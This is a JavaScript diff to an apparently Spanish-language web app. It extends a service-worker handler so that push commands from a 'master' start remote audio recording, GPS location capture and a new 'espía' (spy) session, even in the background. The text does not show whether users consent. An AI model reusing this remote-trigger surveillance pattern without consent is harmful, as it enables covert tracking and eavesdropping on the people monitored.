@@ -2244,14 +2244,32 @@ const Session = (() => {
     );
   }
 
-  // Suscripción a comandos del SW (audio_start, audio_stop, gps_locate)
+  // Suscripción a comandos del SW (audio_start, audio_stop, gps_locate, espía)
+  // [v2.13.66] Agregado MOS_ESPIA_INICIAR/DETENER. Antes solo manejaba
+  // audio/gps → cuando llegaba push de espía en background el SW reenviaba
+  // pero el cliente lo ignoraba (silencio total + master en CONECTANDO
+  // eterno). Ahora se dispara aunque messaging.onMessage no esté activo.
   if ('serviceWorker' in navigator) {
     navigator.serviceWorker.addEventListener('message', (evt) => {
       if (evt.data?.type !== 'mos_command') return;
       const cmd = evt.data.data || {};
-      if (cmd.action === 'audio_start') _audioRemotoIniciarWH(cmd.sesionId, parseInt(cmd.duracionMaxSeg, 10) || 1800);
-      else if (cmd.action === 'audio_stop') _audioRemotoDetenerWH();
-      else if (cmd.action === 'gps_locate') _gpsRegistrarWH(true);
+      const action = cmd.action || cmd.idNotif || '';
+      console.log('[SW msg] cmd recibido:', action);
+      if (action === 'audio_start') {
+        _audioRemotoIniciarWH(cmd.sesionId, parseInt(cmd.duracionMaxSeg, 10) || 1800);
+      } else if (action === 'audio_stop') {
+        _audioRemotoDetenerWH();
+      } else if (action === 'gps_locate') {
+        _gpsRegistrarWH(true);
+      } else if (action === 'MOS_ESPIA_INICIAR') {
+        if (typeof _espiaCliWHIniciar === 'function') {
+          _espiaCliWHIniciar(cmd.sesionId, cmd.masterId);
+        } else { console.warn('[SW msg] _espiaCliWHIniciar no existe'); }
+      } else if (action === 'MOS_ESPIA_DETENER') {
+        if (typeof _espiaCliWHCerrar === 'function') {
+          _espiaCliWHCerrar('master_push_stop');
+        }
+      }
     });
   }
   window._gpsRegistrarWH = _gpsRegistrarWH;
